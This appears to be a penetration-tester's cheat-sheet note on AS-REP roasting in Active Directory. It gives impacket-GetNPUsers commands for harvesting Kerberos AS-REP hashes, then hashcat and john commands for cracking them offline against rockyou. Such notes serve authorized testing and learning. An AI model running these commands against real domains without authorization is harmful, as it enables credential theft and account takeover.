---
tags: [pentest, enumeration, kerberos, asrep, impacket, ad, active-directory, recon, windows]
tool: impacket-GetNPUsers
phase: 3
---
# Impacket GetNPUsers (AS-REP Roasting Enum)

Find AD users with Kerberos pre-authentication disabled and retrieve their AS-REP hashes for offline cracking.

[[04 - Enumeration/00 - README|Folder index]]

## Usage

```bash
# With a user list (no creds needed for the request, but need valid usernames)
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat -outputfile asrep_hashes.txt

# With domain creds (auto-discovers all AS-REP roastable users)
impacket-GetNPUsers corp.local/user:password -dc-ip 10.10.10.10 -request -format hashcat -outputfile asrep_hashes.txt

# No password (null session)
impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat
```

## Crack the hashes

```bash
# Hashcat mode 18200
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# John
john asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Why it works

Users with "Do not require Kerberos preauthentication" enabled allow anyone to request an AS-REP encrypted with the user's password hash — crackable offline.

## See also

- [[14 - Impacket GetUserSPNs (Kerberoast)]] — similar attack, targets SPNs instead
- [[12 - kerbrute]] — find valid usernames to feed into this
